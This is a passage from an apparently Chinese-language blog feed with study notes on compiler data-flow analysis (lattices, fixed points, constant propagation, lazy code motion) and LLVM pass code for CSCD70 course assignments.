class="line">              {</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">              }</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(!flag)</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">                  {</span><br><span class="line">                    r = r &amp; (IDV.<span class="built_in">at</span>(id2));</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(!flag)</span><br><span class="line">                {</span><br><span class="line">                  r = r &amp; dfa::<span class="built_in">Constant</span>({.Value=<span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(operand)-&gt;<span class="built_in">getSExtValue</span>(),.Status=dfa::CONST});</span><br><span class="line">                }</span><br><span class="line">              }    </span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          NewODV.<span class="built_in">at</span>(id1) = r;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; operand : Inst.<span class="built_in">operands</span>())</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isa</span>&lt;ConstantInt&gt;(operand))</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span>((id2 = <span class="built_in">getDomainId</span>(operand.<span class="built_in">get</span>()))!= <span class="number">-1</span>)</span><br><span class="line">                  {</span><br><span class="line">                    <span class="keyword">if</span>(IDV[id2].Status==dfa::NAC)</span><br><span class="line">                    {</span><br><span class="line">                      NewODV[id1].Status = dfa::NAC;</span><br><span class="line">                      ifnac = <span class="literal">true</span>;</span><br><span class="line">                      <span class="keyword">break</span>;</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(IDV[id2].Status == dfa::UNDEF)</span><br><span class="line">                    {</span><br><span class="line">                      NewODV[id1].Status = dfa::UNDEF;</span><br><span class="line">                      ifundef = <span class="literal">true</span>;</span><br><span class="line">                      <span class="keyword">break</span>;</span><br><span class="line">                    }</span><br><span class="line">                  }</span><br><span class="line">                }    </span><br><span class="line">              }</span><br><span class="line">              <span class="keyword">if</span>(!ifnac)</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span>(!ifundef)</span><br><span class="line">                {</span><br><span class="line">                  NewODV[id1].Status = dfa::CONST;</span><br><span class="line">                  NewODV[id1].Value = <span class="built_in">getConstantValue</span>(Inst,IDV);</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">          }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(NewODV==ODV)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    ODV = NewODV;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312142040420.png"></p><h2 id="Lazy-Code-Motion"><a href="#Lazy-Code-Motion" class="headerlink" title="Lazy Code Motion"></a>Lazy Code Motion</h2><p>实现了但效果不好,还是之前那个原因,SSA之后原来相同表达式已经分裂成了不同的表达式….<br>实现的方法看文章开头的数据流分析笔记.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 静态分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
            <tag> CSCD70 </tag>
            
            <tag> 数据流分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据流分析 学习笔记</title>
      <link href="/2023/DataFlow-Analysis/"/>
      <url>/2023/DataFlow-Analysis/</url>
      
        <content type="html"><![CDATA[<p>学习CSCD70 和 南京大学《软件分析》课程中数据流分析部分的笔记与思考.<br>ps: 本篇有许多个人观点,如有错误虚心求教.</p><h2 id="中间表示-IR"><a href="#中间表示-IR" class="headerlink" title="中间表示 IR"></a>中间表示 IR</h2><h3 id="静态单赋值-SSA"><a href="#静态单赋值-SSA" class="headerlink" title="静态单赋值 SSA"></a>静态单赋值 SSA</h3><p>静态单赋值（SSA），就是让每次对变量x赋值都重新使用一个新的变量xi，并在后续使用中选择最新的变量.<br>在控制流汇入同一个块时,导致多个变量备选,则使用合并操作符(phi-function),根据控制流的信息来决定选择哪个变量.</p><span id="more"></span><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101125383.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101127135.png"></p><h3 id="Basic-Blocks-Control-Flow-Graphs"><a href="#Basic-Blocks-Control-Flow-Graphs" class="headerlink" title="Basic Blocks &amp; Control Flow Graphs"></a>Basic Blocks &amp; Control Flow Graphs</h3><p>控制流分析（Control Flow Analysis）通常指的是构建控制流图（Control Flow Graph, CFG），并以 CFG 作为基础结构进行静态分析的过程。<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101129080.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101132709.png"></p><h2 id="可用表达式-活跃变量-到达定值"><a href="#可用表达式-活跃变量-到达定值" class="headerlink" title="可用表达式,活跃变量,到达定值"></a>可用表达式,活跃变量,到达定值</h2><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132214325.png"></p><p>一个易错的例子.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312101557021.png"></p><p>经典的数据流分析算法,以到达定值为例.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132214056.png"></p><p>关于数据流算法的理解,我认为为除entry以外的Basic Block赋初值是无意义的,只是为了便于算法的表示和实现,所以赋予的初值应该对结果无影响.</p><p>比如ForwardAnalysis中,一个基本块的前驱在分析该基本块时还没有分析过(循环),为了分析该块,应该引入一个对结果无影响的Out,即Top(原因后续解释).</p><h2 id="Foudation"><a href="#Foudation" class="headerlink" title="Foudation"></a>Foudation</h2><h3 id="Iterative-Algorithm-Another-View"><a href="#Iterative-Algorithm-Another-View" class="headerlink" title="Iterative Algorithm, Another View"></a>Iterative Algorithm, Another View</h3><p>给定有K个结点的CFG,每次迭代中每个结点产生一个OUT值,一次迭代中所有结点的OUT值的集合定义为k-tuple.每次迭代是对k-tuple执行TransferFunc,如果两次迭代输出的k-tuple相同,算法停止.</p><h3 id="Partial-Order-偏序"><a href="#Partial-Order-偏序" class="headerlink" title="Partial Order 偏序"></a>Partial Order 偏序</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131537373.png"></p><h3 id="poset-偏序集"><a href="#poset-偏序集" class="headerlink" title="poset 偏序集"></a>poset 偏序集</h3><p>pair(一个集合P,一种在P上的偏序关系),称作偏序集.<br>偏序关系: 自反性,反对称性,传递性<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131744430.png"></p><p>偏序关系与全序关系的区别在于，全序关系可以让任意两个元素比较，而偏序关系不保证所有元素都能进行比较.比如偏序关系为substring, si substring sing, ng substring sing, 但si和ng不能进行比较(注意 <code>比较</code> 和<code>判断比较是否为真</code>的区别).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131747871.png"></p><h3 id="Upper-and-Lower-Bounds-上下界"><a href="#Upper-and-Lower-Bounds-上下界" class="headerlink" title="Upper and Lower Bounds 上下界"></a>Upper and Lower Bounds 上下界</h3><p>上下界是相对于子集S来说的.如果取子集S == P,该上下界为偏序集的上下界.<br>并不是每个偏序集都有 lub 和 glb，但是如果有，那么该 lub, glb 将是唯一的<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131754877.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131757973.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131756466.png"></p><h3 id="Lattice-格"><a href="#Lattice-格" class="headerlink" title="Lattice 格"></a>Lattice 格</h3><p>给定一个偏序集，如果任意两个元素 a, b 都有 lub和glb，那么这么偏序集就叫做 格（lattice).只存在其中一个就是半格.<br>全格: 任意一个集合,都有lub和glb.<br>在全格中,一定有一个最大元素Top,最小元素Bottom.注意这里的大小不是直观上的,而是偏序关系的一种形象化表述. 南京大学的软件分析课程在Top和Bottom的定义上似乎与CSCD70有冲突,目前我个人倾向于认为Top和Bottom由偏序关系决定,偏序关系由Meet操作体现,南京大学的课程将Union操作认为是Join,而CSCD70认为Union也是Meet的一种,而Meet和Join分别表示最大下界和最小上界,所以这样的差异导致了两种观点中may analysis在lattice上的移动方向不同.但哪一种是正确的还有待进一步了解,如若有师傅愿意指点一下,感恩!</p><p>下图来自CSCD70.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312140146469.png"></p><p>有穷的格一定是全格,全格不一定有穷(0,1之间所有实数的小于等于关系).</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132101820.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132101169.png"></p><h3 id="Data-Flow-Analysis-Framework-via-Lattice"><a href="#Data-Flow-Analysis-Framework-via-Lattice" class="headerlink" title="Data Flow Analysis Framework via Lattice"></a>Data Flow Analysis Framework via Lattice</h3><p>数据流分析框架(D,L,F)<br>    D:direction for data flow<br>    L: Lattice -&gt; pair(domain of values V ,meet or join).<br>    F: a family of transfer function.<br>数据流分析: 在 lattice 的值上迭代地应用转移方程和 meet/join 操作符.</p><h3 id="Monotonicity-and-Fixed-Point-Theorem"><a href="#Monotonicity-and-Fixed-Point-Theorem" class="headerlink" title="Monotonicity and Fixed Point Theorem"></a>Monotonicity and Fixed Point Theorem</h3><p>基本概念<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132127143.png"></p><p>这张图里单调性的第二种表示看着有点抽象,解释一下,相当于: f(z) ≤ min( f(x),f(y) ),其中z ≤ min(x,y).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131537491.png"></p><p>不动点存在性证明:<br>(其实感觉只是用到了半格的性质,如果用全格的性质加单调性可以直接推F(TOP)=TOP ?)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132140205.png"></p><p>最小不动点证明.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132157490.png"></p><h3 id="Relate-Iterative-Algorithm-to-Fixed-Point-Theorem"><a href="#Relate-Iterative-Algorithm-to-Fixed-Point-Theorem" class="headerlink" title="Relate Iterative Algorithm to Fixed Point Theorem"></a>Relate Iterative Algorithm to Fixed Point Theorem</h3><p>待理解:<br>    每一个结点的OUT的值域是一个Lattice,数据流分析的Lattice是所有上述Lattice的Product.由于一个结点的OUT值域是finite的(Lattice是一个集合,finite指集合的元素有限),所以Product Lattice也是finite的.<br>    至于单调函数,应该从宏观上理解,包含transfer function和join/meet function,输入是上一次迭代的Product Lattice,产生一个新的Product Lattice.(下图的左上方)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132320990.png"></p><p>Transfer function是单调的,因为其的kill集和gen集仅与指令本身有关而与Input无关,单调方向与Input变化相同.Input变化由join/meet function决定.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312132319576.png"></p><h3 id="When-Will-The-Algorithm-The-Fixed-Point"><a href="#When-Will-The-Algorithm-The-Fixed-Point" class="headerlink" title="When Will The Algorithm The Fixed Point?"></a>When Will The Algorithm The Fixed Point?</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131537103.png"></p><p>最坏情况h*k是假设每次迭代只使得一个结点的OUT下降或上升一个高度,但其实不是很理解这种情况如何产生,如何在一次迭代中仅影响到一个结点的OUT?OUT改变意为IN改变,而IN不就是另一个结点的OUT么?<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312140058700.png"></p><h3 id="May-Must-Analysis-A-Lattice-View"><a href="#May-Must-Analysis-A-Lattice-View" class="headerlink" title="May/Must Analysis, A Lattice View"></a>May/Must Analysis, A Lattice View</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141124723.png"></p><h3 id="MOP"><a href="#MOP" class="headerlink" title="MOP"></a>MOP</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141137764.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141137223.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312131537363.png"></p><h2 id="常量传播-稀疏条件常量传播"><a href="#常量传播-稀疏条件常量传播" class="headerlink" title="常量传播,稀疏条件常量传播"></a>常量传播,稀疏条件常量传播</h2><p>单个变量可能值域的Lattice设计为这个样子(回想一下,之前使用的Bool的值域其实也是一个Lattice)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141242129.png"></p><p>Transferfunc像这样.有一点需要注意,之前所说的数据流分析中TranferFunc的单调性依赖于其gen集,kill集与输入无关这一性质,所以OUT与IN成正相关(相对于偏序关系来说).但这里的TransferFunc的gen集明显受到IN的影响,不过分析一下可以发现gen集同样与IN正相关,所以最终的OUT还是正相关的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312141244522.png"></p><h2 id="Lazy-Code-Motion"><a href="#Lazy-Code-Motion" class="headerlink" title="Lazy Code Motion"></a>Lazy Code Motion</h2><p>这个就比较复杂了.先放方法和定义,下面再解释.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161140450.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161141160.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161141424.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161142551.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161142526.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143657.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143147.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143526.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143009.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161143697.png"></p><p>目标 :<br>    所有不复制代码就可消除的冗余计算都被消除<br>    优化后的代码不会执行源程序中不执行的任何计算<br>    表达式的计算应该尽量靠后, 利于寄存器分配</p><p>第一步计算预期执行表达式(绿色部分代表可预期执行),根据可预期执行的定义,在这些点放置表达式<code>不会执行源程序中不执行的任何计算</code>,且计算结果正确. 这是放置的正确性.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161156316.png"></p><p>第二步计算(将要)可用表达式,是假设在刚刚预期执行表达式分析结果为True的所有点放置对该的表达式计算后,再进行字面意义上的可用表达式分析(金色部分代表可用).</p><p>此时预期执行表达式-可用表达式得到的便是最有效的放置点.在被预期执行但不可用的所有点放置该表达式的计算,最小化了放置的数量,且使得刚刚通过假设所有预期执行点放置计算之后的可用表达式的分析结果成立. 这是放置的有效性. 最有效的放置点集合为Earliest.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161215797.png"></p><p>其实到这里已经完成了从部分冗余表达式到完全冗余表达式的转换,可以完成消除,但还不够完美.因为在Earliest的点放置表达式的计算,意味着表达式的生命周期最长,需要占据寄存器的时间就越长,所以接下来应该尽可能将放置推迟.</p><p>最多能推迟到什么地方呢?答案很明显,推迟到表达式的值被使用之前.(黑色部分代表可后延)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161231989.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161229468.png"></p><p>最后求Latest集合的公式: 前半部分是可放置的点,后半部分是边界条件,And之后得到最晚的可放置的点.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161255730.png"><br>(也许第一幅图里的Postponable少了个.inB<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161252370.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161300387.png"></p><p>最终结果:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161305583.png"></p><p>涉及到的数据流分析:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161318935.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161318683.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161318742.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161319712.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312161319787.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 静态分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
            <tag> 数据流分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSCD70-Assignment1 Introduction to LLVM</title>
      <link href="/2023/CSCD70-Assignment1/"/>
      <url>/2023/CSCD70-Assignment1/</url>
      
        <content type="html"><![CDATA[<h1 id="函数信息"><a href="#函数信息" class="headerlink" title="函数信息"></a>函数信息</h1><span id="more"></span><p>没啥好说的.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FunctionInfoPass</span> <span class="keyword">final</span> : <span class="keyword">public</span> PassInfoMixin&lt;FunctionInfoPass&gt; {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">PreservedAnalyses <span class="title">run</span><span class="params">([[maybe_unused]] Module &amp;M, ModuleAnalysisManager &amp;)</span> </span>{</span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">"CSCD70 Function Information Pass"</span></span><br><span class="line">           &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; F : M.<span class="built_in">functions</span>())</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Function Name: "</span> &lt;&lt; F.<span class="built_in">getName</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Number of Arguments: "</span> &lt;&lt; F.<span class="built_in">arg_size</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Number of Calls: "</span> &lt;&lt; F.<span class="built_in">getNumUses</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Number OF BBs: "</span> &lt;&lt; F.<span class="built_in">size</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">      <span class="built_in">outs</span>() &lt;&lt; <span class="string">"Number of Instructions: "</span> &lt;&lt; F.<span class="built_in">getInstructionCount</span>() &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">  }</span><br><span class="line">}; <span class="comment">// class FunctionInfoPass</span></span><br></pre></td></tr></tbody></table></figure><h1 id="局部优化"><a href="#局部优化" class="headerlink" title="局部优化"></a>局部优化</h1><h2 id="代数恒等式"><a href="#代数恒等式" class="headerlink" title="代数恒等式"></a>代数恒等式</h2><h3 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h3><p>加减运算中,其中一个操作数为常量0;乘除运算中,其中一个操作数为常量1.</p><p>在判别常量的值的时候,需要这样的转化:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Value* oper1 =In.<span class="built_in">getOperand</span>(<span class="number">0</span>)</span><br><span class="line">ConstVal1 = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper1)-&gt;<span class="built_in">getSExtValue</span>()</span><br></pre></td></tr></tbody></table></figure><p>但是在二元运算中,操作数不一定是ConstantInt,所以需要先判别一下:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1))</span><br></pre></td></tr></tbody></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>用代数恒等式的最终值代替所有引用该指令结果的地方,然后删除该指令.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In.<span class="built_in">replaceAllUsesWith</span>(AlgebraicIdentity);</span><br></pre></td></tr></tbody></table></figure><p>删除指令应该在遍历完所有指令之后,否则可能会导致迭代器失效.<br>一个相关的demo如下:</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">vec</span><span class="params">({<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>})</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(std::vector&lt;<span class="type">int</span>&gt;::iterator iter = vec.<span class="built_in">begin</span>();iter!=vec.<span class="built_in">end</span>();++iter)</span><br><span class="line">    {</span><br><span class="line">        std::cout &lt;&lt; *iter &lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        vec.<span class="built_in">erase</span>(iter);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g++ test.cpp &amp;&amp; ./a.out</span><br><span class="line">22145664082593 0872 180082552 2 6101240994215 82538  19428801684252 4048 9411899120 87594 220361632 217 91908160516051605 88948 81625610688 288 288 288 211024042 80848 8242 242 242 242 0 80094 85240422961 961 961 961 87619 85558 23824 894 894 894 89286254005 213 959527952795279527221 52042352892352045204520452049 87673 54062283040 040 040 040 84094 84344 840972344 844 844 844 844 844 844 844 844 840972344 840972344 891303733 94279427942794279427942794279427942748211 876164408 540161074 540161016101610161074 540161074 540161074 </span><br><span class="line">......</span><br><span class="line">段错误</span><br></pre></td></tr></tbody></table></figure><p>将所有要删除的指令加入一个vector,最后统一删除.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">delIns</span><span class="params">(std::vector&lt;Instruction*&gt; InsList)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; ins : InsList)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span>(ins-&gt;<span class="built_in">isSafeToRemove</span>())</span><br><span class="line">    {</span><br><span class="line">      ins-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>注意这里使用的是eraseFromParent,使用removeFromParent会导致如下错误:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Instruction referencing instruction not embedded in a basic block!</span><br><span class="line">  %<span class="number">5</span> = sdiv i32 %<span class="number">3</span>, <span class="number">10</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// This method unlinks 'this' from the containing basic block, but does not</span></span><br><span class="line"><span class="comment">/// delete it.</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">removeFromParent</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// This method unlinks 'this' from the containing basic block and deletes it.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \returns an iterator pointing to the element after the erased one</span></span><br><span class="line">SymbolTableList&lt;Instruction&gt;::<span class="function">iterator <span class="title">eraseFromParent</span><span class="params">()</span></span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PreservedAnalyses <span class="title">AlgebraicIdentityPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             FunctionAnalysisManager &amp;)</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// @todo(CSCD70) Please complete this method.</span></span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  std::vector&lt;Instruction*&gt; del_InsList;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; BB : F)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; In : BB)</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span>(In.<span class="built_in">isBinaryOp</span>())</span><br><span class="line">      {</span><br><span class="line">        Value* AlgebraicIdentity = <span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">auto</span> oper1 =In.<span class="built_in">getOperand</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">auto</span> oper2 =In.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">int64_t</span> ConstVal1,ConstVal2;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper1))</span><br><span class="line">          ConstVal1 = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper1)-&gt;<span class="built_in">getSExtValue</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;ConstantInt&gt;(oper2))</span><br><span class="line">          ConstVal2 = <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(oper2)-&gt;<span class="built_in">getSExtValue</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (In.<span 